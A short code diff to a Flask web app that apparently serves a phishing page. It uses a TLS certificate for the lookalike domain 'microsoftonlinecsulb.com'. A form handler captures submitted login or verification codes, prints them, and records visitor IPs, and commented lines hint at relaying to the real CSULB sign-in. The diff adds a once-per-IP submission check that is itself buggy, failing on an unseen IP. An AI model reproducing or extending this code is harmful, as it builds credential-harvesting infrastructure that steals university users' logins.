@@ -39,7 +39,7 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 
 connections = {}
 
-
+submitted = {}
 # chrome = main.startChrome()
 
 @app.route('/profile')
@@ -120,10 +120,12 @@ def text():
     # Here we use a class of some kind to represent and validate our
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
-    
+    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
+    if submitted[ip] == True:
+        return render_template('index.html')
+    submitted[ip] = True
     code = request.form.get('code')
     print(code)
-    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
     # yield redirect("https://sso.csulb.edu/")
     print("still here")
     try:
